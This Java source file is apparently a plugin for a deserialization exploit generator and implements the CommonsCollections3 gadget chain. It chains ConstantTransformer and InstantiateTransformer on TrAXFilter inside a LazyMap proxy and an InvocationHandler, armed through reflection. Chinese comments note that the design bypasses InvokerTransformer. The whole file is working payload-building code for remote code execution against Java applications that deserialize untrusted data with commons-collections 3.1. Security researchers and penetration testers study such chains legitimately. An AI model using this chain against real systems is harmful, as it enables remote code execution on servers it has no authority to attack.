package com.ar3h.plugin.fr;

import com.ar3h.chains.common.Gadget;
import com.ar3h.chains.common.GadgetChain;
import com.ar3h.chains.common.GadgetContext;
import com.ar3h.chains.common.annotations.GadgetAnnotation;
import com.ar3h.chains.common.annotations.GadgetTags;
import com.ar3h.chains.common.util.PayloadHelper;
import com.ar3h.chains.common.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import static com.ar3h.chains.common.Tag.JavaNativeDeserialize;
import static com.ar3h.chains.common.Tag.TemplatesImplChain;

/**
 * @Author se1zer
 * @Date 2024/8/17 20:49
 */
@GadgetTags(
        tags = JavaNativeDeserialize, // JavaNativeDeserialize 代表这是Java反序列化链的开始
        nextTags = TemplatesImplChain // 需要指定标签的Gadget，符合其一即可满足条件。代码中通过 gadgetChain.doCreate(gadgetContext) 获取
)
@GadgetAnnotation(
        name = "CommonsCollections3",
        description = "CommonsCollections1的变化，使用 InstantiateTransformer 绕过 InvokerTransformer",
        dependencies = {"commons-collections:commons-collections:3.1", "jdk<=8u71"},
        authors = {"se1zer"},
        priority = 10 // 展示顺序的优先级，默认100，数字越小越优先，会在级联选择器上方优先看到
)
public class CommonsCollections3 implements Gadget {

    public Object getObject(Object templates) throws Exception {
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templates } )};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);



        final Map mapProxy = PayloadHelper.createMemoitizedProxy(lazyMap, Map.class);

        final InvocationHandler handler = PayloadHelper.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return handler;
    }

    @Override
    public Object invoke(GadgetContext gadgetContext, GadgetChain gadgetChain) throws Exception {
        Object templates = gadgetChain.doCreate(gadgetContext); // 获取下一层的gadget构建结果，也就是 templates 对象
        return getObject(templates); // 构建并返回
    }
}
